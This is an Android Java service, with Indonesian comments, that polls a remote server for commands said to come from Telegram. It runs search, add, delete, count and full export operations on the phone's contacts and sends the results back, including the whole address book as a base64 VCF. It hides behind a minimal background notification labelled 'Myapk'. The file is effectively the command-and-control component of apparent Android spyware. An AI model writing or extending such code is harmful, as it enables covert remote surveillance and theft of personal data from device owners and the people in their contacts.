package com.example.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Base64;
import android.util.Log;

import androidx.annotation.Nullable;

import org.json.JSONObject;

import java.util.List;

/**
 * Service polling untuk request manajemen kontak dari Telegram.
 *
 * Operasi yang ditangani:
 * - search   — cari kontak berdasarkan nama
 * - add      — tambah kontak baru
 * - delete   — hapus kontak
 * - export   — ekspor semua kontak ke VCF
 * - count    — tampilkan jumlah kontak
 *
 * Wajib di AndroidManifest.xml:
 *   <service android:name=".ContactPollingService" android:exported="false"/>
 */
public class ContactPollingService extends Service {

    private static final String TAG             = "ContactPollingService";
    private static final String CHANNEL_ID      = "contact_polling";
    private static final int    NOTIFICATION_ID = 9000;

    private static final long POLL_INTERVAL_MS = 10_000L;

    private Handler  pollHandler;
    private Runnable pollRunnable;
    private boolean  isPolling    = false;
    private boolean  isProcessing = false;

    // =========================================================
    // LIFECYCLE
    // =========================================================

    @Override
    public void onCreate() {
        super.onCreate();
        pollHandler = new Handler(Looper.getMainLooper());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startForeground(NOTIFICATION_ID, buildNotification());

        if (!isPolling) {
            isPolling    = true;
            pollRunnable = this::poll;
            pollHandler.post(pollRunnable);
        }

        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isPolling = false;
        if (pollHandler != null && pollRunnable != null) {
            pollHandler.removeCallbacks(pollRunnable);
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    // =========================================================
    // POLLING
    // =========================================================

    private void poll() {

        if (!isPolling) return;

        if (isProcessing) {
            scheduleNextPoll(POLL_INTERVAL_MS);
            return;
        }

        new Thread(() -> {

            try {
                JSONObject result = ApiHelper.getContactRequest();

                if (result == null ||
                        !"success".equalsIgnoreCase(
                                result.optString("status", ""))) {
                    scheduleNextPoll(POLL_INTERVAL_MS);
                    return;
                }

                JSONObject request = result.optJSONObject("request");

                if (request == null) {
                    scheduleNextPoll(POLL_INTERVAL_MS);
                    return;
                }

                String requestId = request.optString("id",        "");
                String operation = request.optString("operation", "");
                String params    = request.optString("params",    "");

                if (requestId.isEmpty() || operation.isEmpty()) {
                    scheduleNextPoll(POLL_INTERVAL_MS);
                    return;
                }

                Log.d(TAG, "Contact request: op=" + operation + " params=" + params);

                isProcessing = true;
                handleContactRequest(requestId, operation, params);

            } catch (Exception e) {
                Log.e(TAG, "Error polling contacts", e);
                isProcessing = false;
                scheduleNextPoll(POLL_INTERVAL_MS);
            }

        }).start();
    }

    private void scheduleNextPoll(long delayMs) {
        if (!isPolling) return;
        pollHandler.postDelayed(pollRunnable, delayMs);
    }

    // =========================================================
    // HANDLE REQUEST
    // =========================================================

    private void handleContactRequest(
            String requestId, String operation, String params) {

        final Context ctx = getApplicationContext();

        new Thread(() -> {

            try {

                switch (operation.toLowerCase()) {

                    case "search": {
                        List<ContactHelper.Contact> contacts =
                                ContactHelper.searchContacts(ctx, params);

                        if (contacts.isEmpty()) {
                            ApiHelper.sendContactResult(
                                    requestId, operation,
                                    "🔍 Tidak ditemukan kontak: *" + params + "*",
                                    null);
                        } else {
                            StringBuilder sb = new StringBuilder();
                            sb.append("🔍 Hasil pencarian *")
                              .append(params)
                              .append("* (")
                              .append(contacts.size())
                              .append("):\n\n");

                            for (ContactHelper.Contact c : contacts) {
                                sb.append(c.formatted()).append("\n\n");
                            }

                            ApiHelper.sendContactResult(
                                    requestId, operation,
                                    sb.toString().trim(), null);
                        }
                        break;
                    }

                    case "add": {
                        // Format params: "Nama|Nomor" atau "Nama|Nomor|Email"
                        String[] parts = params.split("\\|", 3);
                        String name    = parts.length > 0 ? parts[0].trim() : "";
                        String phone   = parts.length > 1 ? parts[1].trim() : "";
                        String email   = parts.length > 2 ? parts[2].trim() : "";

                        boolean ok = ContactHelper.addContact(
                                ctx, name, phone, email);

                        ApiHelper.sendContactResult(
                                requestId, operation,
                                ok
                                ? "✅ Kontak *" + name + "* berhasil ditambahkan"
                                : "❌ Gagal menambahkan kontak",
                                null);
                        break;
                    }

                    case "delete": {
                        int deleted = ContactHelper.deleteContact(ctx, params);

                        ApiHelper.sendContactResult(
                                requestId, operation,
                                deleted > 0
                                ? "✅ " + deleted + " kontak berhasil dihapus"
                                : "❌ Tidak ditemukan kontak: " + params,
                                null);
                        break;
                    }

                    case "export": {
                        String vcf = ContactHelper.exportContactsVcf(ctx);

                        if (vcf.isEmpty()) {
                            ApiHelper.sendContactResult(
                                    requestId, operation,
                                    "❌ Tidak ada kontak untuk diekspor",
                                    null);
                        } else {
                            String vcfBase64 = Base64.encodeToString(
                                    vcf.getBytes(), Base64.NO_WRAP);

                            ApiHelper.sendContactResult(
                                    requestId, operation,
                                    null,
                                    vcfBase64);
                        }
                        break;
                    }

                    case "count": {
                        int total = ContactHelper.getContactCount(ctx);
                        ApiHelper.sendContactResult(
                                requestId, operation,
                                "📋 Total kontak di HP: *" + total + "*",
                                null);
                        break;
                    }

                    default:
                        ApiHelper.sendContactResult(
                                requestId, operation,
                                "❌ Operasi tidak dikenal: " + operation,
                                null);
                        break;
                }

            } catch (Exception e) {
                Log.e(TAG, "Error handling contact request", e);
                ApiHelper.sendContactResult(
                        requestId, operation,
                        "❌ Error: " + e.getMessage(), null);
            }

            isProcessing = false;
            scheduleNextPoll(POLL_INTERVAL_MS);

        }).start();
    }

    // =========================================================
    // NOTIFIKASI
    // =========================================================

    private Notification buildNotification() {

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID, "Myapk", NotificationManager.IMPORTANCE_MIN
            );
            channel.setShowBadge(false);
            channel.setSound(null, null);
            channel.enableVibration(false);
            channel.enableLights(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(channel);
        }

        Notification.Builder builder =
                new Notification.Builder(this, CHANNEL_ID)
                        .setContentTitle("Myapk")
                        .setContentText("Berjalan di latar belakang")
                        .setSmallIcon(android.R.drawable.ic_menu_myplaces)
                        .setOngoing(true);

        return builder.build();
    }

    // =========================================================
    // HELPER STATIS
    // =========================================================

    public static void start(Context context) {
        Intent intent = new Intent(context, ContactPollingService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }
    }

    public static void stop(Context context) {
        context.stopService(new Intent(context, ContactPollingService.class));
    }
}
